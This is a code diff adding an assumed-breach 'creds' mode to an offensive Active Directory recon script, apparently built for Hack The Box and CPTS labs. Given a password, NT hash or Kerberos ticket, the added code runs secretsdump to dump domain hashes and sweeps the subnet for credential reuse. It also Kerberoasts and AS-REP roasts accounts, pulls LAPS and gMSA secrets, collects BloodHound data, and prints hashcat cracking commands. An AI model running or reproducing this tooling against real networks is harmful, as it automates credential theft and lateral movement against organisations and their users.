@@ -3,8 +3,9 @@
 recon.py — Automated CPTS-style recon orchestrator.
 
 Wraps standard Kali tooling (nmap, nxc/netexec, smbclient, rpcclient,
-ldapsearch, dig, whatweb, ffuf, kerbrute, enum4linux-ng, snmpwalk) to
-produce structured per-target output ready for branch decisions.
+ldapsearch, dig, whatweb, ffuf, kerbrute, enum4linux-ng, snmpwalk;
+creds-mode adds impacket-GetUserSPNs/findDelegation/secretsdump, certipy-ad,
+bloodhound-python) to produce structured per-target output ready for branch decisions.
 
 Defaults are AGGRESSIVE: full TCP (-p-), UDP top-100, web brute, AD enum,
 SSL audit, vhost fuzz — just point it at an IP and walk away.
@@ -14,6 +15,9 @@ Usage:
     sudo ./recon.py <IP> --hostname dc01 --domain eighteen.htb
     sudo ./recon.py <IP> --fast                           # top-1000 TCP, no UDP
     sudo ./recon.py <IP> --quiet                          # disable live mirror
+    ./recon.py <DC_IP> --mode creds --user alex --domain x.htb --password 'P@ss'   # assumed breach
+    ./recon.py <DC_IP> --mode creds --user alex --domain x.htb --hash <NT>         # pass-the-hash
+    ./recon.py <DC_IP> --mode creds --user alex --domain x.htb --fqdn dc.x.htb --kerberos  # ccache
 
 Output tree (default ./recon_<IP>_<timestamp>):
     nmap/        — full TCP, UDP, scripted vuln/discovery scans
@@ -1412,6 +1416,163 @@ def host_mode(args) -> int:
     return 0
 
 
+def creds_mode(args) -> int:
+    """Assumed-breach: valid creds in hand, no shell yet (connected.htb-style).
+
+    RUNS the credentialed AD sweep (shares, kerberoast, asrep, descriptions,
+    bloodhound, certipy) into loot files — not just prints commands. Auth via
+    password (-p), NT hash (-H), or ccache (-k, reads $KRB5CCNAME).
+    """
+    if not args.user or not (args.password or args.hash or args.kerberos):
+        err("--mode creds requires --user and one of --password / --hash / --kerberos"); return 2
+    ip = args.ip
+    if not ip:
+        err("--mode creds requires the DC IP"); return 2
+    dom = args.domain or ""
+    fqdn = args.fqdn or (f"{args.hostname}.{dom}".lower() if args.hostname and dom else (args.hostname or ip))
+
+    started = datetime.now()
+    out = Path(args.out) if args.out else Path(f"creds_{ip}_{started.strftime('%Y%m%d_%H%M%S')}")
+    out.mkdir(parents=True, exist_ok=True)
+    global RUN_LOG, MIRROR
+    RUN_LOG = out / "run.log"
+    RUN_LOG.write_text(f"# recon.py creds-mode\n# target: {ip} domain: {dom}\n"
+                       f"# started: {started.isoformat(timespec='seconds')}\n"
+                       f"# argv: {' '.join(sys.argv)}\n\n")
+    MIRROR = not args.quiet
+    ok(f"Output dir → {out}")
+
+    # Auth flags shared by every nxc call. NEVER echo the secret to summary.
+    nxc_auth: list[str] = ["-u", args.user]
+    if args.kerberos:
+        nxc_auth += ["-k", "--use-kcache"]
+        if not os.environ.get("KRB5CCNAME"):
+            warn("--kerberos set but $KRB5CCNAME is unset — `export KRB5CCNAME=<ccache>` first")
+    elif args.hash:
+        nxc_auth += ["-H", args.hash]
+    else:
+        nxc_auth += ["-p", args.password]
+    use_kerb = bool(args.kerberos)
+    host = fqdn if use_kerb else ip   # Kerberos needs FQDN; NTLM is happy with IP
+
+    # impacket auth — shared across GetUserSPNs / secretsdump / findDelegation
+    def imp_auth() -> list[str]:
+        if args.kerberos: return ["-k", "-no-pass"]
+        if args.hash:     return ["-hashes", f":{args.hash}"]
+        return []
+    def imp_id(at_host: str | None = None) -> str:
+        s = f"{dom}/{args.user}" if dom else args.user
+        if args.password: s += f":{args.password}"
+        if at_host:       s += f"@{at_host}"
+        return s
+
+    findings: list[str] = []
+    def hit(s: str) -> None: findings.append(f"[+] {s}")
+
+    # nxc ldap with automatic LDAPS/636 fallback when the 389 bind is refused
+    # (signing-enforced / channel-binding DCs reject plaintext LDAP).
+    def ldap_call(extra: list[str], outfile: Path, tag: str, timeout: int = 600):
+        rc, o = run(["nxc", "ldap", host] + nxc_auth + extra,
+                    outfile=outfile, timeout=timeout, tag=tag)
+        if re.search(r"could not connect|strongerAuthRequired|channel binding|"
+                     r"signing is required|STATUS_NOT_SUPPORTED|connection.*reset", o, re.I):
+            warn(f"{tag}: LDAP/389 refused — retrying over LDAPS/636")
+            rc, o = run(["nxc", "ldap", host, "--port", "636"] + nxc_auth + extra,
+                        outfile=outfile, timeout=timeout, tag=tag + "-ldaps")
+        return rc, o
+
+    # ── 0. validate the cred + check admin everywhere ───────────────────────
+    is_admin = False
+    if have("nxc"):
+        rc, o = run(["nxc", "smb", host] + nxc_auth, outfile=out / "00_auth_check.txt", tag="auth")
+        if "(Pwn3d!)" in o:
+            is_admin = True
+            hit("LOCAL ADMIN on the DC/host — see 00_secretsdump.txt + try evil-winrm")
+        elif "[+]" not in o:
+            warn("cred did not validate ([+] not seen) — check domain/realm/hash before continuing")
+
+    # ── 0b. LOUD: dump secrets when admin (DCSync on DC / SAM+LSA on member). Lab-only. ──
+    if is_admin and have("impacket-secretsdump") and dom:
+        run(["impacket-secretsdump", imp_id(at_host=fqdn), "-dc-ip", ip] + imp_auth() +
+            ["-outputfile", str(out / "00_secretsdump")],
+            outfile=out / "00_secretsdump.txt", timeout=600, tag="secretsdump")
+        if (out / "00_secretsdump.ntds").exists() or (out / "00_secretsdump.sam").exists():
+            hit("secretsdump succeeded — NT hashes in 00_secretsdump.* → PtH / crack -m 1000")
+        # Sweep the /24 for admin + reuse
+        seg = re.sub(r"\.\d+$", ".0/24", ip)
+        run(["nxc", "smb", seg] + nxc_auth, outfile=out / "01_smb_sweep.txt", timeout=900, tag="smb-sweep")
+        for proto in ("winrm", "rdp", "mssql"):
+            run(["nxc", proto, seg] + nxc_auth, outfile=out / f"01_{proto}_sweep.txt", timeout=900, tag=f"{proto}-sweep")
+
+        # ── 1. authenticated SMB: shares + write perms + spider ─────────────
+        run(["nxc", "smb", host] + nxc_auth + ["--shares"], outfile=out / "02_shares.txt", tag="shares")
+        run(["nxc", "smb", host] + nxc_auth + ["--users"], outfile=out / "02_users.txt", tag="users")
+        run(["nxc", "smb", host] + nxc_auth + ["--pass-pol"], outfile=out / "02_pass_pol.txt", tag="passpol")
+        run(["nxc", "smb", host] + nxc_auth + ["-M", "spider_plus"],
+            outfile=out / "02_spider.txt", timeout=900, tag="spider")
+
+        # ── 2. authenticated LDAP (LDAPS/636 auto-fallback): roast + delegation + laps/gmsa ─
+        ldap_call(["--kerberoasting", str(out / "03_kerberoast.hash")],
+                  out / "03_kerberoast.txt", "kerberoast")
+        ldap_call(["--asreproast", str(out / "03_asrep.hash")],
+                  out / "03_asrep.txt", "asrep")
+        ldap_call(["--trusted-for-delegation"], out / "03_delegation.txt", "deleg")
+        ldap_call(["--admin-count"], out / "03_admincount.txt", "admincount")
+        ldap_call(["--gmsa"], out / "03_gmsa.txt", "gmsa")
+        ldap_call(["-M", "laps"], out / "03_laps.txt", "laps")
+        # Descriptions field — passwords hide here
+        ldap_call(["--query", "(&(objectClass=user)(description=*))", "sAMAccountName description"],
+                  out / "03_descriptions.txt", "descriptions")
+
+    # ── 3. Kerberoast + delegation via impacket (independent of nxc path) ────
+    if have("impacket-GetUserSPNs") and dom:
+        run(["impacket-GetUserSPNs", imp_id(), "-dc-ip", ip] + imp_auth() +
+            ["-request", "-outputfile", str(out / "04_getuserspns.hash")],
+            outfile=out / "04_getuserspns.txt", tag="getuserspns")
+    if have("impacket-findDelegation") and dom:
+        run(["impacket-findDelegation", imp_id(), "-dc-ip", ip] + imp_auth(),
+            outfile=out / "04_finddelegation.txt", tag="finddelegation")
+
+    # ── 4. ADCS discovery ──────────────────────────────────────────────────
+    if have("certipy-ad") and dom:
+        cer = ["certipy-ad", "find", "-dc-ip", ip, "-ns", ip, "-vulnerable", "-stdout"]
+        if args.kerberos: cer += ["-k", "-no-pass", "-target", fqdn]
+        elif args.hash:   cer += ["-u", f"{args.user}@{dom}", "-hashes", args.hash]
+        else:             cer += ["-u", f"{args.user}@{dom}", "-p", args.password]
+        rc, o = run(cer, outfile=out / "05_adcs.txt", timeout=300, tag="certipy")
+        if re.search(r"ESC\d", o): hit("ADCS vulnerable template (ESC*) — see 05_adcs.txt → §6.2")
+
+    # ── 5. BloodHound collection ────────────────────────────────────────────
+    if have("bloodhound-python") and dom:
+        bh = ["bloodhound-python", "-d", dom, "-dc", fqdn, "-ns", ip, "-c", "All", "--zip"]
+        if args.kerberos: bh += ["-u", args.user, "-k", "-no-pass", "--use-kcache"]
+        elif args.hash:   bh += ["-u", args.user, "--hashes", f":{args.hash}"]
+        else:             bh += ["-u", args.user, "-p", args.password]
+        bhdir = out / "bloodhound"; bhdir.mkdir(exist_ok=True)
+        cwd = os.getcwd(); os.chdir(bhdir)
+        try:
+            run(bh, outfile=out / "06_bloodhound.txt", timeout=600, tag="bloodhound")
+        finally:
+            os.chdir(cwd)
+
+    # ── findings from harvested hashes ──────────────────────────────────────
+    for hf, mode, what in (("03_kerberoast.hash", "13100", "Kerberoastable accounts"),
+                           ("04_getuserspns.hash", "13100", "Kerberoastable (impacket)"),
+                           ("03_asrep.hash", "18200", "AS-REP roastable accounts")):
+        p = out / hf
+        if p.exists() and p.stat().st_size > 0:
+            hit(f"{what} → crack: hashcat -m {mode} {p} rockyou.txt")
+    _purge_empty_files(out)
+
+    elapsed = (datetime.now() - started).total_seconds()
+    print(f"\n[+] creds-mode done in {elapsed:.0f}s — loot dir: {out}")
+    print("[+] priority findings:")
+    for f in findings or ["    (none auto-flagged — review 02_shares.txt + bloodhound/)"]:
+        print(f"    {f}")
+    print("[i] next: import bloodhound/*.zip → mark owned → Shortest Paths from Owned")
+    return 0
+
+
 # ---------------------------------------------------------------------------
 # CLI
 # ---------------------------------------------------------------------------
@@ -1423,11 +1584,19 @@ def main() -> int:
     )
     ap.add_argument("ip", nargs="?",
                     help="Target IP address (required for --mode external; ignored for --mode host).")
-    ap.add_argument("--mode", choices=("external", "host"), default="external",
+    ap.add_argument("--mode", choices=("external", "host", "creds"), default="external",
                     help="external = scan a remote target (default); "
-                         "host = post-foothold enum on THIS host (Linux only — pure stdlib).")
+                         "host = post-foothold enum on THIS host (Linux only — pure stdlib); "
+                         "creds = assumed-breach AD sweep with valid creds (connected.htb-style).")
     ap.add_argument("--hostname", help="Short hostname (e.g. dc01)")
     ap.add_argument("--domain", help="Domain / realm (e.g. eighteen.htb)")
+    # --mode creds auth (assumed breach: valid creds, no shell yet)
+    ap.add_argument("--user", help="[creds] Username")
+    ap.add_argument("--password", help="[creds] Cleartext password")
+    ap.add_argument("--hash", help="[creds] NT hash for pass-the-hash")
+    ap.add_argument("--kerberos", action="store_true",
+                    help="[creds] Auth via ccache in $KRB5CCNAME (-k --use-kcache)")
+    ap.add_argument("--fqdn", help="[creds] DC FQDN (required for Kerberos auth)")
     ap.add_argument("--out", help="Output directory "
                                   "(external: ./recon_<IP>_<ts>; host: ./loot_<host>_<ts>)")
     # Scope toggles — ALL DEFAULT ON; flags exist to *disable*
@@ -1455,6 +1624,10 @@ def main() -> int:
     # ── HOST MODE ── post-foothold on-host enumeration (no scanning, no IP needed)
     if args.mode == "host":
         return host_mode(args)
+
+    # ── CREDS MODE ── assumed breach: valid creds, no shell yet
+    if args.mode == "creds":
+        return creds_mode(args)
 
     # ── EXTERNAL MODE ── original behavior; requires a target
     if not args.ip:
